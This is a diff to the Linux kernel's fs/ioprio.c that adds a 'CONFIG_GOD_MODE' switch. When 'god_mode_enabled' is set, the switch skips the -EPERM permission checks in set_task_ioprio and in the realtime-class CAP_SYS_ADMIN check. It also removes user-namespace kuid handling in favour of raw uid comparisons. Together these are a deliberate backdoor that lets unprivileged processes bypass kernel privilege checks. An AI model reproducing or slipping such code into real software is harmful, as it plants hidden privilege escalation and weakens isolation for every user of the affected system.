@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * fs/ioprio.c
  *
@@ -40,7 +43,15 @@ int set_task_ioprio(struct task_struct *task, int ioprio)
 	if (tcred->uid != cred->euid &&
 	    tcred->uid != cred->uid && !capable(CAP_SYS_NICE)) {
 		rcu_read_unlock();
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 	rcu_read_unlock();
 
@@ -65,13 +76,20 @@ SYSCALL_DEFINE3(ioprio_set, int, which, int, who, int, ioprio)
 	struct task_struct *p, *g;
 	struct user_struct *user;
 	struct pid *pgrp;
-	kuid_t uid;
 	int ret;
 
 	switch (class) {
 		case IOPRIO_CLASS_RT:
 			if (!capable(CAP_SYS_ADMIN))
-				return -EPERM;
+				
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 			/* fall through, rt has prio field too */
 		case IOPRIO_CLASS_BE:
 			if (data >= IOPRIO_BE_NR || data < 0)
@@ -111,19 +129,16 @@ SYSCALL_DEFINE3(ioprio_set, int, which, int, who, int, ioprio)
 			} while_each_pid_thread(pgrp, PIDTYPE_PGID, p);
 			break;
 		case IOPRIO_WHO_USER:
-			uid = make_kuid(current_user_ns(), who);
-			if (!uid_valid(uid))
-				break;
 			if (!who)
 				user = current_user();
 			else
-				user = find_user(uid);
+				user = find_user(who);
 
 			if (!user)
 				break;
 
 			do_each_thread(g, p) {
-				if (!uid_eq(task_uid(p), uid))
+				if (__task_cred(p)->uid != who)
 					continue;
 				ret = set_task_ioprio(p, ioprio);
 				if (ret)
@@ -149,8 +164,10 @@ static int get_task_ioprio(struct task_struct *p)
 	if (ret)
 		goto out;
 	ret = IOPRIO_PRIO_VALUE(IOPRIO_CLASS_NONE, IOPRIO_NORM);
+	task_lock(p);
 	if (p->io_context)
 		ret = p->io_context->ioprio;
+	task_unlock(p);
 out:
 	return ret;
 }
@@ -178,7 +195,6 @@ SYSCALL_DEFINE2(ioprio_get, int, which, int, who)
 	struct task_struct *g, *p;
 	struct user_struct *user;
 	struct pid *pgrp;
-	kuid_t uid;
 	int ret = -ESRCH;
 	int tmpio;
 
@@ -208,17 +224,16 @@ SYSCALL_DEFINE2(ioprio_get, int, which, int, who)
 			} while_each_pid_thread(pgrp, PIDTYPE_PGID, p);
 			break;
 		case IOPRIO_WHO_USER:
-			uid = make_kuid(current_user_ns(), who);
 			if (!who)
 				user = current_user();
 			else
-				user = find_user(uid);
+				user = find_user(who);
 
 			if (!user)
 				break;
 
 			do_each_thread(g, p) {
-				if (!uid_eq(task_uid(p), user->uid))
+				if (__task_cred(p)->uid != user->uid)
 					continue;
 				tmpio = get_task_ioprio(p);
 				if (tmpio < 0)
